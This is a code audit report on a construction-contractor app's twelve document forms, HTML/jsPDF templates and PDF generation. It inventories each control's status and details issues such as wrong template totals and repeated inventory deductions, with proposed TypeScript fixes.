# 02: Document forms, templates and PDF pipeline

Scope: the root `components/*Form.tsx` (12 forms), `SelectDocType`, `TemplateSelector`, `SignaturePad`, `SetupSignatureModal`, `DocumentCard`, `DuplicateJobModal`, `ConfirmationModal`, `ShareModal`, `services/pdfGenerator.ts`, `utils/templates/*`, `utils/richTextHtml.ts`, `utils/ocr.ts`, `utils/imageCompression.ts`, `hooks/useDocumentDraftPrefill.ts`, `utils/dailyReportSetup.ts`, `components/DocumentWidgets/*`, document types in `types.ts`, plus how `App.tsx` opens and saves forms.

Method: I read every file listed above line by line, plus the relevant parts of `App.tsx` (`renderForm`, `handleSaveForm`, `openAIDraft`, `fetchData`, `loadDocumentData`, duplicate and delete handlers), `src/hooks/useContractorAI.ts`, `components/AIDocumentModal.tsx`, `components/AIVisualComponents.tsx`, `components/CommunicationView.tsx` (PDF attachment part) and `supabase/functions/process-contractor-ai`. I also bundled the 20 HTML templates with esbuild and rendered them under Node with a known invoice and a known daily report (harness: `C:\Users\JAAF\AppData\Local\Temp\claude\0525b7dc1b82fde1\899e5ea6-4ae9-4f76-b151-9adb35c003eb\scratchpad\tpl_test.ts`). Where this report says "test harness" it refers to that run. Its output is in section 3, DOC-001.

Status legend: **CONFIRMED** = provable from code (and, where stated, reproduced by the harness). **LIKELY** = the code path is real but the trigger depends on runtime conditions I could not execute (network timing, App re-render frequency, device).

---

## 1. How it works

### 1.1 Opening a form

1. Every view is derived from the URL. `App.tsx:835-900` (`view` memo) maps `/jobs/:jobId/forms/:formType/:formId?` to `{ screen:'form', formType, jobId, formId, prefillData: location.state?.prefillData }`.
2. `setView` (`App.tsx:902-931`) turns a view back into a URL. For forms it calls `navigate(path, { state: { prefillData } })`, so **AI prefill data is stored in `history.state`**.
3. The entry points into a form are:
   - SelectDocType tile: `setView({screen:'form', formType, jobId, formId:null})` (`App.tsx:3073`).
   - Document card click: `setView({... formId: form.id})` (`App.tsx:2960`).
   - AI draft: `openAIDraft` (`App.tsx:1069-1095`) passes `prefillData = {...draft, ai_open_mode, auto_submit: mode==='auto_save', start_page:1}`.
   - Client quick-create: `handleNavigateToNewDoc` (`App.tsx:2284-2316`).
4. `renderForm` (`App.tsx:2980-3020`):
   - If `formId` is set but the doc in `forms` is missing or still the lightweight metadata row (`__lightweight` flag), it shows "Loading document…". The full JSON is fetched by the effect at `App.tsx:1879-1883` (`loadDocumentData`), which runs only when `formId` changes.
   - It then mounts the form with `key = formId || 'new-<type>-ai|blank'` and passes `job`, `profile`, `clients`, `data`/`invoice`/`report`/`note`, `onSave={handleSaveForm}`, `onBack/onClose`, `onUploadImage={handleUploadDocumentImage}`, `prefillData`, and for some forms `savedItems`, `inventoryItems`/`inventory` and `publicToken`.

### 1.2 Form lifecycle (identical skeleton in all 12 forms)

- `useState(data || defaults)`. The defaults are built from `profile` and `job`. Dates use `new Date().toISOString().split('T')[0]` (UTC). Some defaults are module-level constants (Invoice and DailyReport).
- A "profile sync" `useEffect` copies company name, address and logo from `profile` into new documents.
- A "prefill" `useEffect`: `newData = {...state, ...prefillData, <field-by-field overrides>, isAiGenerated:true}`. If `prefillData.auto_submit` is set, it calls `onSave(newData)` after 1000 ms (1200 ms in DailyReport). Nine forms list `[prefillData, onSave]` as dependencies; Invoice, DailyReport and Note list `[prefillData]`.
- Pages: most forms are two-step (page 1 = header/company/client, page 2 = items/signature/template). ExpenseLog, Warranty, Receipt and Note are single-page.
- Footer buttons: **Save (Only/Draft)** → `onSave(state)`. **Download PDF** → `generateXxxPDF(profile, job, state, state.templateId)`. **Save & Download** → `onSave(state); await handleDownload()`.
- No form uses a `<form>` element, and none awaits `onSave`, disables the save buttons while saving, or guards against unsaved changes.

### 1.3 Saving (`App.tsx:2089-2147`, `handleSaveForm`)

1. `dataToSave = {...formData, isAiGenerated?}`. `formRecord.id = view.formId || crypto.randomUUID()`, so **each call for a new doc creates a new id**.
2. Material Log only: if `formData.deductInventory`, it loops over items and calls `handleAllocateInventory` (read-modify-write on `inventory`, `App.tsx:2491-2500`) **before** the upsert. It then sets `formData.deductInventory=false` on the *argument object*, not on `dataToSave`.
3. `supabase.from('documents').upsert(formRecord)`, then an optimistic `setForms`, then `await loadDocumentsForJob(jobId, true)`.
4. If an AI queue is pending it opens the next draft; otherwise it navigates to `jobDetails`. **Every save navigates away from the form.**

### 1.4 Data shapes (`types.ts`)

`FormData = { id, jobId, type: FormType, createdAt, data: <union>, public_token? }`. The main data types:

| Type | Key fields | Money fields |
|---|---|---|
| InvoiceData | invoiceNumber, issueDate, dueDate, status, lineItems[], isProgressBilling, recurrence, paypalLink | taxRate %, discount $, shipping $ |
| EstimateData | estimateNumber, issueDate, expiryDate, status, lineItems[], terms, clientSignatureUrl/At/By | (none: no tax or discount) |
| ChangeOrderData | changeOrderNumber, date, reason, description, currentContractSum, lineItems[] | none |
| PurchaseOrderData | poNumber, date, deliveryDate, status, vendor*, shipTo*, lineItems[], notes | none |
| WorkOrderData | workOrderNumber, date, status, description, materialsUsed, hours, cost, terms | cost |
| DailyJobReportData | reportNumber, date, weather, temperature, content (HTML), projectName/Address, clientName | none |
| TimeSheetData | workerName, date, hoursWorked, overtimeHours, notes | none |
| MaterialLogData | date, projectName, items[{name, supplier, quantity, unitCost, inventoryItemId}], deductInventory | none |
| ExpenseLogData | date, vendor, category, lineItems[] (form) / items[] (legacy, used by PDF), amount, tax | amount, tax |
| WarrantyData | warrantyNumber, clientName, projectAddress, completedDate, duration, coverage, conditions | none |
| ReceiptData | receiptNumber, date, clientName, amount, description, paymentMethod | amount |
| NoteData | title, content (HTML), tags | none |

All of them extend `DocumentStyle { templateId?, themeColors?{primary, secondary} }`, and most have an optional `ai_visual_data: { metrics?, progress_percentage?, chart_data?, widgets?, suggested_widget_types? }`.

### 1.5 Template system

- **10 "standard" templates** (`standard, professional, elegant, warm, retro, modern_blue, tech, industrial, minimal, bold`) are jsPDF drawing styles in `pdfGenerator.ts:398-409`. There are two layouts: `certificate` (double border, centered header) and `modern` (colored top band).
- **20 "premium" HTML templates** (`template_html … template_serif`) are string-builder functions in `utils/templates/documentHtmlTemplates.ts` (5) and `newHtmlTemplates.ts`, `allNewTemplates.ts`, `secondSetTemplates.ts`, `thirdSetTemplates.ts` (15, re-exported by `allNewTemplates.ts`). Each has the signature `(data, profile, title, labels) => html` and was designed for invoice/estimate line items.
- `templateAdapters.ts: adaptTemplateForContentDocument` reuses those functions for Daily Report and Note. It blanks the line items and totals, removes empty tables and empty `<div>`s by regex, and injects `content` (+ AI visual HTML) at a regex-detected position.
- `TemplateSelector.tsx` shows the 10 standard templates (tab "Standard") and the 20 premium ones (tab "Premium") as live thumbnails. Each thumbnail is an `<iframe srcDoc>` rendered with dummy invoice data. Two color pickers write `themeColors`.

### 1.6 PDF pipeline (`services/pdfGenerator.ts`)

```
Form → generateXxxPDF(profile, job, data, templateId, getBlob?)
        ├─ if templateId ∈ htmlTemplates (Invoice: 20, Estimate: 15, DailyReport: 20, Note: 20, all others: 0)
        │     html = templateFn(data, profile, TITLE, labels)        (Daily/Note: via adaptTemplateForContentDocument)
        │     renderHtmlToPdf(doc, html, 0, 0, 210)
        │        #pdf-render-content (off-screen div in index.html:384).innerHTML = '' ; wrapper.innerHTML = html
        │        html2canvas(container, {scale:2, useCORS:true}) → one tall canvas
        │        slices the canvas into A4 page-height JPEGs → doc.addImage per page; re-adds <a> link annotations
        └─ else jsPDF drawing: drawDocumentHeader (logo via loadImage = fetch→dataURL) → drawContactGrid →
              jspdf-autotable table → totals text → notes → (AI visual HTML via renderHtmlToPdf) → signature image
        → doc.save(...) or doc.output('datauristring')   (getBlob=true: generateDocumentBase64 for email attachments)
```

jsPDF 2.5.1, jspdf-autotable 3.8.3 and html2canvas 1.4.1 are window globals from `index.html:19-21`. Tesseract 5.0.5 is used for receipt OCR (`utils/ocr.ts`).

---

## 2. Feature & button inventory

Issue refs point to section 3. "Works" means the control does what it says on screen. PDF fidelity is tracked under the referenced issues.

### 2.1 InvoiceForm (`components/InvoiceForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Header back arrow | 1022 | Leave form | Works (no unsaved-changes prompt) | DOC-035 |
| AI button (page 1) | 407-419, 1006-1014 | AI fills the fields of this invoice | **Broken** | DOC-003 |
| Company name/address/phone/website | 425-440 | Edit sender block | Works | |
| Client name/address | 444-451 | Edit recipient (no saved-client picker, unlike the other forms) | Partial | |
| Invoice # | 461 | Unique number | Partial (default always `…-001`) | DOC-022 |
| Issue / Due date | 465, 469 | Dates | Partial (UTC default) | DOC-022 |
| Status select | 473-485 | Draft/Sent/Paid/Overdue/Cancelled | Works | |
| Logo upload | 491-492 | Upload + preview | Partial (transparent PNG turns black, silent failure) | DOC-021 |
| "Repeat this invoice" + frequency + next date | 507-544 | Auto-create invoices | **Broken** (never processed) | DOC-023 |
| Cancel | 551 | Leave | Works | DOC-035 |
| "Test AI Infographics" | 553-559 | (debug) | **Should not ship**: overwrites client/items with mock data | DOC-024 |
| Next | 560 | Page 2 | Works | |
| Switch billing mode | 575-583 | Standard ↔ progress | Partial | DOC-001, DOC-030 |
| Line description | 612-617 | Edit | Works (unusable width on phones) | DOC-031 |
| Price Book / Inventory picker | 618-626, 911-996 | Fill the line from catalog | Partial | DOC-037 |
| Quick Add to Price Book | 627-635 | Save the line to the price book | **Broken** (prop never passed) | DOC-025 |
| Stock indicator | 637-643 | Show stock | Works | |
| Qty / Rate / % complete | 650-695 | Edit numbers | Works (`parseFloat \|\| 0`) | |
| Remove line (×) | 706-711 | Remove | Works (hidden when only 1 line) | |
| Kit contents / Hide on PDF | 715-757 | Show assembly parts | Works | |
| + Add Item | 762 | Add line | Works | |
| Subtotal/Discount/Tax/Shipping/Total | 770-811 | Totals | Works on screen; **premium PDF wrong** | DOC-001, DOC-038 |
| Include Payment Link + URL | 819-848 | Pay Now button in PDF | Partial (standard PDF only) | DOC-009 |
| Notes | 854-861 | Notes | Works (overlaps in the PDF) | DOC-014 |
| AI visuals block | 865-869 | Show metrics/chart | Partial (`widgets` ignored) | DOC-034 |
| Signature pad | 875-878 | Sign | Works (missing in premium PDF) | DOC-009 |
| Template selector + colors | 883-888 | Choose look | Works (premium output wrong) | DOC-001, DOC-009 |
| Back | 894 | Page 1 | Works | |
| Save Only | 896 | Save | Works (duplicate-insert risk) | DOC-007 |
| Share | 898 | Email the invoice | **Broken** (modal unmounts because save navigates away) | DOC-017 |
| Download PDF | 901 | PDF | Partial | DOC-001, DOC-014 |
| Save & Download | 904 | Both | Partial (race) | DOC-007 |

### 2.2 EstimateForm (`components/EstimateForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| AI button | 368-380, 759-767 | AI fill | **Broken** | DOC-003 |
| Title | 385 | Dashboard title | Works | |
| Company name/address | 391-392 | Sender | Works (phone/website have no input) | |
| Logo upload | 394-398 | Logo | Partial | DOC-021 |
| Saved-client select | 405-408 | Fill client | Works | |
| Client name/address | 410-411 | Recipient | Works | |
| Estimate # / Status / Issue / Expiry | 416-419 | Header | Works (UTC defaults; random number) | DOC-022 |
| Cancel | 423 | Leave | Works | DOC-035 |
| "Test AI Infographics" | 425-431 | (debug) | Should not ship | DOC-024 |
| Next: Items | 432 | Page 2 | Works | |
| Show Profit Tools (desktop) / Profit View (mobile floating) | 445-453, 456-463 | Toggle cost columns | Works (mobile button overlaps other UI) | DOC-031 |
| Line description + picker | 480-489, 651-737 | Edit / pick | Partial | DOC-037 |
| Quick Add to Price Book | 490-498 | Save to price book | **Broken** | DOC-025 |
| Qty / Unit cost / Rate | 509, 513-519, 523 | Numbers | **Partial**: clearing a field gives NaN and "$NaN" | DOC-018 |
| Remove / Add item | 526, 530 | Lines | Works | |
| Profit dashboard | 534-557 | Revenue/cost/margin | Works | |
| Total Estimate | 559-566 | Total | Works (no tax/discount support at all) | DOC-038 |
| Notes / Terms | 569-570 | Text | Works (terms missing in 19/20 premium templates) | DOC-009 |
| AI visuals | 574-578 | Show | Partial | DOC-034 |
| Get Approval Link | 585-593 | Copy public link | Partial (unsaved docs get save-then-navigate; clipboard not awaited) | DOC-039 |
| Contractor signature | 602 | Sign | Works (missing in premium PDF) | DOC-009 |
| Client signature (read-only) | 610-623 | Show approval | Works on screen; missing in premium PDF | DOC-009 |
| Template selector | 626 | Choose look | **Partial**: 5 premium ids silently fall back | DOC-011 |
| Save Draft / Download / Save & Download | 632-647 | Save/PDF | Partial | DOC-007 |

### 2.3 WorkOrderForm (`components/WorkOrderForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| AI button | 159-171, 367-383 | AI fill | **Broken** | DOC-003 |
| Title, WO #, Date, Status | 177-210 | Header | Works | DOC-022 |
| Company name/address, logo | 220-227 | Sender | Works | DOC-021 |
| Saved-client select + client fields | 235-250 | Recipient | Works | |
| Cancel / Next | 256-257 | Nav | Works | |
| Description / Materials | 271-290 | Text | Works (AI prefill puts raw HTML here) | DOC-026 |
| Labor hours / Cost | 296, 300 | Numbers | Works on screen; the PDF crashes on string/null values | DOC-015 |
| Terms | 306-312 | Text | Works | |
| Signature | 318-321 | Sign | Works | |
| Template selector | 326-331 | Look | **Partial**: every premium template falls back to standard | DOC-011 |
| Save Draft / Download / Save & Download | 337-343 | Save/PDF | Partial | DOC-007 |

### 2.4 DailyJobReportForm (`components/DailyJobReportForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| AI button | 873-885, 1197-1205 | AI fill | **Broken** | DOC-003 |
| Company fields | 891-894 | Sender | Works | |
| Saved-client select (with job-client option) | 900-913 | Fill client | Works (crashes if clientName is null) | DOC-032 |
| Project name / client / address | 915-917 | Fields | Works | |
| Weather / temperature | (no input) | Weather line in the PDF | **Missing UI**: the PDF prints " / " | DOC-028 |
| Report # / Date | 924-925 | Header | Works (default `DR-…-001` constant) | DOC-022 |
| Logo | 930-931 | Logo | Works | DOC-021 |
| Signature | 936-939 | Sign | Works | |
| Template selector | 946-951 | Look | Works (4 premium templates drop the content) | DOC-010 |
| AI "Report preview" | 953-961 | Preview AI content | Works, but renders **raw unsanitized HTML** | DOC-013 |
| Cancel / "Test Rich Text" / Next | 964-973 | Nav / debug | Debug button should not ship | DOC-024 |
| Template preview iframe | 1007-1011 | Live preview | Works (rebuilds on each keystroke; no sandbox) | DOC-033, DOC-013 |
| Toolbar + editor | 1013-1027 | Rich text | Works | |
| Image resize handle | 1030-1034 | Resize | Partial (mouse only, no touch) | DOC-031 |
| Camera / Voice / Upload image | 1037-1048 | Insert media | Works (stored as base64 in the JSON) | DOC-033 |
| Link / Table / Camera modals | 1070-1177 | Insert | Works (table rows NaN if cleared) | DOC-038 |
| Back / Save Only / Download / Save & Download | 1054-1062 | Save/PDF | Partial | DOC-007, DOC-028 |

### 2.5 TimeSheetForm (`components/TimeSheetForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Title, company, logo | 157-179 | Header | Works | |
| Client select + fields | 186-200 | Client | Works | |
| Worker / Date | 209, 213 | Fields | Works | DOC-022 |
| Cancel / Next | 218-219 | Nav | Works | |
| Regular / OT hours | 234, 238 | Numbers | Works on screen; PDF total concatenates if AI gives strings | DOC-015 |
| Notes | 244-251 | Text | Works | DOC-026 |
| Signature | 257-260 | Sign | Works | |
| Template selector | 265-270 | Look | **Partial**: premium falls back | DOC-011 |
| Save / Download / Save & Download | 276-282 | Save/PDF | Partial | DOC-007 |

### 2.6 MaterialLogForm (`components/MaterialLogForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Title, company, logo, client select, client/project, date | 177-201 | Header | Works | |
| Load from Inventory (per row) | 218-236 | Link inventory item | Works | |
| Remove row (x) | 237 | Remove | Works | |
| Item / Supplier / Qty / Cost | 240-243 | Edit | **Partial**: NaN when cleared; saved as null; PDF crash | DOC-018, DOC-015 |
| + Add Material | 248 | Add | Works | |
| On-screen total | (none) | Running total | **Missing** | DOC-028 |
| "Deduct used quantities from Inventory on save" | 253-262 | Deduct once | **Broken**: deducts again on every save | DOC-002 |
| Signature | 268 | Sign | Captured but **never printed in the PDF** | DOC-028 |
| Template selector | 273 | Look | Partial | DOC-011 |
| Save / Download / Save & Download | 279-281 | Save/PDF | Partial | DOC-007 |

### 2.7 ExpenseLogForm (`components/ExpenseLogForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Upload Receipt (OCR) | 275-282, 417-427 | Scan and fill | Partial | DOC-020 |
| Scan notification close | 293 | Dismiss | Works | |
| Title, company, logo, client | 300-321 | Header | Works (OCR overwrites your company with the vendor) | DOC-020 |
| Date / Vendor / Category | 326-335 | Fields | Works | |
| + Add Item / item rows / remove | 341-373 | Lines | Works on screen (key=index) | |
| Tax | 384-391 | Tax $ | Works | |
| Total | 395 | Auto sum | Partial (overwrites the OCR amount; crashes on string tax) | DOC-020 |
| Notes / Signature / Template | 402-414 | | Works / Partial (premium falls back) | DOC-011 |
| Save / Download / Save & Download | 429-431 | Save/PDF | **PDF item table always empty** | DOC-012 |

### 2.8 WarrantyForm (`components/WarrantyForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Title, Warranty ID, completion date | 147-166 | Header | Works | DOC-022 |
| Client select / Issued to / Location | 172-193 | Client | Works | |
| Duration / Coverage / Conditions | 199-223 | Text | Works (long text runs off the PDF page) | DOC-014 |
| Company logo upload | 228-238 | "Override logo for this document" | **Dead in output**: the PDF never draws a logo or company name | DOC-028 |
| Signature | 245-248 | Sign | Works | |
| Template selector | 255-260 | Look | Partial: only the primary color is used; premium falls back | DOC-011 |
| Save Draft / Download / Save & Download | 264-271 | Save/PDF | Partial | DOC-007 |

### 2.9 NoteForm (`components/NoteForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Title | 682 | Title | Works | |
| Toolbar / editor | 686-699 | Rich text | Works | |
| Resize handle | 700-730 | Resize | Mouse only | DOC-031 |
| Camera / Voice / Upload | 733-745 | Insert media | Works (base64) | DOC-033 |
| Template selector | 749-754 | Look | Works (4 premium templates drop the content) | DOC-010 |
| Save Only / Download / Save & Download | 758-765 | Save/PDF | Partial | DOC-007 |
| Link / Table / Camera modals | 555-662 | Insert | Works | |

### 2.10 ReceiptForm (`components/ReceiptForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Company name/address, logo | 149-153 | Sender | Works (the PDF never prints the company block) | DOC-028 |
| Receipt # / Date | 157-158 | Header | Works | |
| Client select + name | 166-170 | Payer | Works | |
| Amount | 176 | $ | Works on screen; PDF crashes on string/null | DOC-015 |
| Description / Payment method | 179-180 | Text | Works (description is unwrapped in the PDF) | DOC-014 |
| Signature / Template | 186-191 | | Works / Partial | DOC-011 |
| Save / Download / Save & Download | 195-197 | | Partial; the PDF always stamps "PAID IN FULL" | DOC-028 |

### 2.11 ChangeOrderForm (`components/ChangeOrderForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| AI button | 282-294, 577-593 | AI fill | **Broken** | DOC-003 |
| Title, CO #, Date, Reason, Description | 299-327 | Header | Works (raw HTML from AI in the description) | DOC-026 |
| Company, logo, client select, client fields | 335-359 | Parties | Works | |
| Cancel / Next | 364-365 | Nav | Works | |
| Current contract value | 377-384 | $ | Works | |
| Line rows + picker / remove / add | 390-418, 498-557 | Lines | **Partial**: NaN on cleared qty/rate | DOC-018 |
| Totals | 421-435 | Current / net / new | Works | |
| Terms | 438 | Text | Works | |
| Get Approval Link | 446-454 | Copy link | Partial | DOC-039 |
| Contractor signature / client signature | 463, 471-484 | Sign / show | Works | |
| Template selector | 487 | Look | Partial (premium falls back) | DOC-011 |
| Save Draft / Download / Save & Download | 493-495 | | Partial; **edits can be reset** | DOC-019, DOC-007 |

### 2.12 PurchaseOrderForm (`components/PurchaseOrderForm.tsx`)

| Control | file:line | Intended behavior | Status | Issue |
|---|---|---|---|---|
| Title, PO #, order date, required date | 186-208 | Header | Works | |
| Vendor name/address/phone | 215-217 | Vendor | Works (no vendor email input although the type has it) | DOC-028 |
| Ship-to toggle Job Site / Company Office | 226-237 | Fill ship-to | Works ("Custom" type unreachable) | |
| Ship-to name/address/phone, instructions | 243-255 | Fields | Works | |
| Status / Notes | (none) | Track PO | **Missing UI** (type has `status`, `notes`) | DOC-028 |
| Line rows / add / remove | 273-281 | Lines | **Partial**: NaN | DOC-018 |
| Total | 284-289 | Total | Works | |
| Signature / Template | 294, 299 | | Works / Partial | DOC-011 |
| Save / Download / Save & Download | 305-307 | | Partial; edits can be reset | DOC-019 |

### 2.13 Shared components

| Component | Control | file:line | Status | Issue |
|---|---|---|---|---|
| SelectDocType | Back | 116 | Works | |
| SelectDocType | 12 document tiles | 62-92, 132-146 | Works (`proDocs` empty, `limit`/`docCount` unused) | |
| TemplateSelector | Standard / Premium tabs | 287-299 | Works | |
| TemplateSelector | Template cards (iframe previews) | 303-345 | Works (heavy: 20 iframes) | DOC-033, DOC-011 |
| TemplateSelector | Primary / Secondary color | 349-376 | Works (hidden when the doc has no `themeColors`; secondary unused by jsPDF) | DOC-041 |
| SignaturePad | Clear | 135 | Works | |
| SignaturePad | Draw (mouse/touch) | 145-155 | Works (not resize/DPR aware; distorts on redraw) | DOC-031 |
| SetupSignatureModal | Close / Cancel / Save / typed signature | 58-107 | Works (a drawn signature silently wins over a typed one) | DOC-042 |
| ShareModal | To / Subject / Body / Copy / Open Email App | 106-137 | Partial (wrong total, says "attached" but nothing is attached) | DOC-017 |
| DocumentCard | Open / Duplicate / Delete | 54, 80, 84 | Works (Duplicate copies approvals and recurrence) | DOC-029 |
| DuplicateJobModal | Name / Client / Select all / None / doc checkboxes / Duplicate | 87-139 | Partial (resets on re-render, only loaded docs, no busy guard) | DOC-029 |
| ConfirmationModal | Close / Cancel / Confirm | 34, 51, 58-67 | Works (async errors swallowed, no Esc key) | |

---

## 3. Issues

### Shared helpers referenced by several fixes

Create these once. Most fixes below use them.

**`utils/documentTotals.ts`** (new): the single source of truth for money math, used by forms, jsPDF, HTML templates and ShareModal.

```ts
export const toNum = (v: unknown, fallback = 0): number => {
  if (typeof v === 'number') return Number.isFinite(v) ? v : fallback;
  if (typeof v === 'string') {
    const n = parseFloat(v.replace(/[^0-9.\-]/g, ''));
    return Number.isFinite(n) ? n : fallback;
  }
  return fallback;
};
export const round2 = (n: number) => Math.round((n + Number.EPSILON) * 100) / 100;
export const money = (n: unknown) => `$${toNum(n).toFixed(2)}`;

export interface LineLike { quantity?: unknown; rate?: unknown; percentComplete?: unknown; previouslyBilled?: unknown }
export interface TotalsInput {
  lineItems?: LineLike[]; isProgressBilling?: boolean;
  discount?: unknown; taxRate?: unknown; shipping?: unknown;
}

export function lineAmount(li: LineLike, progress = false): number {
  const scheduled = toNum(li.quantity) * toNum(li.rate);
  if (!progress) return round2(scheduled);
  const pct = Math.min(100, Math.max(0, toNum(li.percentComplete)));
  const billedToDate = round2(scheduled * pct / 100);
  return round2(billedToDate - toNum(li.previouslyBilled));     // see DOC-030
}

export function computeDocumentTotals(d: TotalsInput) {
  const progress = !!d.isProgressBilling;
  const lines = (d.lineItems || []).map(li => lineAmount(li, progress));
  const subtotal = round2(lines.reduce((a, b) => a + b, 0));
  const discount = round2(Math.min(Math.max(0, toNum(d.discount)), Math.max(0, subtotal)));
  const taxable = round2(subtotal - discount);
  const taxRate = Math.max(0, toNum(d.taxRate));
  const tax = round2(taxable * taxRate / 100);
  const shipping = round2(Math.max(0, toNum(d.shipping)));
  return { lines, subtotal, discount, taxable, taxRate, tax, shipping, total: round2(taxable + tax + shipping) };
}

/** Use in every numeric <input onChange> */
export const parseInputNumber = (raw: string, fallback = 0) => toNum(raw, fallback);
```

**`utils/html.ts`** (new): escaping for every HTML template.

```ts
export const esc = (v: unknown): string =>
  String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
export const safeUrl = (u?: unknown): string => {
  const s = String(u ?? '');
  return /^(https:\/\/|http:\/\/|data:image\/(png|jpe?g|webp|gif);base64,)/i.test(s) ? esc(s) : '';
};
export const safeColor = (c?: unknown, fallback = '#000000'): string =>
  /^#[0-9a-f]{3}([0-9a-f]{3})?([0-9a-f]{2})?$/i.test(String(c ?? '')) ? String(c) : fallback;
/** plain text (textarea) → safe HTML with line breaks */
export const textToHtml = (v: unknown) => esc(v).replace(/\r?\n/g, '<br/>');
```

**`hooks/useAsyncAction.ts`** (new): disables a button while its async action runs.

```ts
import { useCallback, useRef, useState } from 'react';
export function useAsyncAction<A extends unknown[]>(fn: (...a: A) => unknown | Promise<unknown>) {
  const [busy, setBusy] = useState(false);
  const busyRef = useRef(false);
  const fnRef = useRef(fn); fnRef.current = fn;
  const run = useCallback(async (...a: A) => {
    if (busyRef.current) return;
    busyRef.current = true; setBusy(true);
    try { await fnRef.current(...a); } finally { busyRef.current = false; setBusy(false); }
  }, []);
  return [run, busy] as const;
}
```

---

### DOC-001: Premium HTML templates print wrong totals (all 20) and ignore progress billing
- **Severity:** Critical
- **Status:** CONFIRMED (test harness)
- **Location:**
  - `utils/templates/documentHtmlTemplates.ts:85-87, 211-213, 383-385, 532-534, 673-676`
  - `newHtmlTemplates.ts:25-27, 176-178`
  - `allNewTemplates.ts:30-32, 136-138, 296-298`
  - `secondSetTemplates.ts:19-21, 114-115, 213-214, 305-306, 388-389`
  - `thirdSetTemplates.ts:18-19, 103-104, 186-187, 281-282, 359-360`
  - `pdfGenerator.ts:558-563` (no pre-processing)
- **What's wrong:** The form (`InvoiceForm.tsx:369-374`) and the jsPDF output (`pdfGenerator.ts:619-634`) compute `total = (subtotal − discount) × (1 + tax%) + shipping`. The templates use three different, wrong formulas:
  - 10 templates: `tax = subtotal × rate` (tax charged on the pre-discount amount), then `total = subtotal + tax + shipping − discount`.
  - Glassmorphism: `total = subtotal + subtotal × rate` (discount and shipping ignored).
  - 9 templates (blueprint, memphis, crimson, watercolor, swiss, space, retro, pop, serif): `total = subtotal + (data.tax || 0)`. Invoices have no `tax` field, so **tax, discount and shipping all disappear**.

  No template reads `isProgressBilling` or `percentComplete`, so a progress invoice prints the full scheduled value as the amount due.
- **Repro:** An invoice with 2 × $100, discount $20, tax 10%, shipping $5. The screen shows **$203.00**. The harness output:
  ```
  template_html / html_2 / html_3 / html_4 / neon / luxury / nature / geometric / pastel / vintage → $205.00
  template_html_2_new → $220.00
  blueprint / memphis / crimson / watercolor / swiss / space / retro / pop / serif → $200.00
  ```
  A progress invoice at 50% of $10,000 prints $10,000 due instead of $5,000. The customer receives a PDF with a different amount than the one the contractor saw and saved.
- **Root cause:** Each template re-implements money math, and nothing hands it pre-computed totals.
- **Fix (shared):** Normalize the data once in `pdfGenerator.ts` before calling any template, then make the templates use the normalized `tax`.

  ```ts
  // services/pdfGenerator.ts
  import { computeDocumentTotals, toNum } from '../utils/documentTotals.ts';

  const prepareTemplateData = (raw: any) => {
    const t = computeDocumentTotals(raw);
    const lineItems = (raw.lineItems || []).map((li: any, i: number) => raw.isProgressBilling
      ? { ...li, quantity: 1, rate: t.lines[i],
          description: `${li.description} (${toNum(li.percentComplete)}% of $${(toNum(li.quantity) * toNum(li.rate)).toFixed(2)})` }
      : { ...li, quantity: toNum(li.quantity), rate: toNum(li.rate) });
    return {
      ...raw,
      lineItems,
      tax: t.tax,                  // tax on (subtotal - discount)
      discount: t.discount, shipping: t.shipping,
      signature: raw.signatureUrl || raw.signature || '',   // DOC-009
      __totals: t,
    };
  };

  // in generateInvoicePDF / generateEstimatePDF (HTML branch):
  - const html = templateFn(invoice, profile, ...)
  + const html = templateFn(prepareTemplateData(invoice), profile, ...)
  ```

  In each template, use the injected `tax` and a single total formula:

  ```diff
  - const tax = data.tax || (subtotal * ((data.taxRate || 0) / 100)) || 0;
  - const total = subtotal + tax + (data.shipping || 0) - (data.discount || 0);
  + const t = data.__totals;
  + const tax = t ? t.tax : (subtotal * ((data.taxRate || 0) / 100));
  + const total = t ? t.total : subtotal + tax + (data.shipping || 0) - (data.discount || 0);
  ```

  Apply the same change to the 9 templates that use `const total = subtotal + (data.tax || 0);`. In Glassmorphism (`documentHtmlTemplates.ts:211-213`) replace the 3-line calculation the same way. Add "Discount" and "Shipping" rows where they are missing. Finally, make `InvoiceForm.tsx:356-374` and `pdfGenerator.ts:619-634` call `computeDocumentTotals` so the screen, the jsPDF output and the HTML output share one formula.
- **Affected files:** all 5 template files, `pdfGenerator.ts`, `InvoiceForm.tsx`, `ShareModal.tsx`.

### DOC-002: Material Log "deduct inventory" runs again on every save; deduction is non-atomic and happens before the save
- **Severity:** Critical
- **Status:** CONFIRMED
- **Location:** `App.tsx:2093-2122`, `App.tsx:2491-2500`, `MaterialLogForm.tsx:253-262`, `88`
- **What's wrong:**
  1. `dataToSave` is spread from `formData` at 2093. The line `formData.deductInventory = false` at 2121 mutates the argument after the copy, so the stored JSON keeps `deductInventory: true`. The form re-reads `true` on open, so every later save deducts the stock again.
  2. `handleAllocateInventory` reads `inventory` from the render closure. Two rows that point to the same item both compute from the same stale quantity, so only one deduction sticks.
  3. Deduction runs before the upsert. If the save fails, stock is still deducted.
  4. There is no stock check, and the result is clamped at 0, which silently hides overdraws.
  5. `inventory.quantity` is `INTEGER` (`App.tsx:261`), so fractional quantities (2.5 m) make the update fail. The error is ignored.
  6. AI prefill can set `deductInventory` (`MaterialLogForm.tsx:88`) together with `auto_submit`, which deducts stock without the user clicking anything.
- **Repro:** Create a log with 5 units linked to inventory, tick "Deduct", save: stock −5. Reopen the log, fix a typo, save: stock −5 again.
